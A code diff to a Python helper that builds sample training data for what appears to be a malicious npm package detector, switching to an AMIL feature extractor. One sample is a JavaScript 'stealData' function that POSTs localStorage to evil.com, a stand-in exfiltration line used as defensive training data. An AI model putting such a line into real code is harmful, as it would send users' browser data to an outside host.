@@ -45,37 +45,30 @@ def create_sample_data():
 
     logger.info("Creating sample training data...")
 
-    # Import UnitFeatures for creating realistic samples
-    from amil.feature_extractor import UnitFeatures
+    # Import required classes and create feature extractor
+    from amil.feature_extractor import AMILFeatureExtractor
+    from amil.config import create_default_config
 
-    # Sample benign unit features
-    benign_unit = UnitFeatures(
-        unit_name="isValid",
-        file_path="src/utils.js",
-        unit_type="function",
-        ecosystem="npm",
+    # Create default config and feature extractor
+    amil_config, _, _ = create_default_config()
+    feature_extractor = AMILFeatureExtractor(amil_config)
+
+    # Sample benign unit features (properly extracted)
+    benign_unit = feature_extractor.extract_unit_features(
         raw_content="function isValid(input) { return input != null && input.length > 0; }",
-        api_counts={"validation": 1},
-        shannon_entropy=3.2,
-        obfuscation_score=0.1,
-        phase="runtime",
-        file_size_bytes=156,
-        num_imports=0
+        file_path="src/utils.js",
+        unit_name="isValid",
+        unit_type="function",
+        ecosystem="npm"
     )
 
-    # Sample malicious unit features
-    malicious_unit = UnitFeatures(
-        unit_name="stealData",
-        file_path="src/stealer.js",
-        unit_type="function",
-        ecosystem="npm",
+    # Sample malicious unit features (properly extracted)
+    malicious_unit = feature_extractor.extract_unit_features(
         raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
-        api_counts={"net.outbound": 1},
-        shannon_entropy=4.1,
-        obfuscation_score=0.3,
-        phase="runtime",
-        file_size_bytes=98,
-        num_imports=0
+        file_path="src/stealer.js",
+        unit_name="stealData",
+        unit_type="function",
+        ecosystem="npm"
     )
 
     # Sample benign package
